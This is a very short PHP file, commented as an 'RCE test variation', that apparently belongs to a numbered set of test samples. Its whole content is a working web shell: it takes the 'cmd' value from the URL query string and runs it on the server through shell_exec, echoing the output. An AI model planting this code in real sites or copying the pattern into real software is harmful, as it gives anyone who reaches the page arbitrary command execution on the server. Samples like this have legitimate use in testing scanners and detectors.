<?php
// RCE test variation #526
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>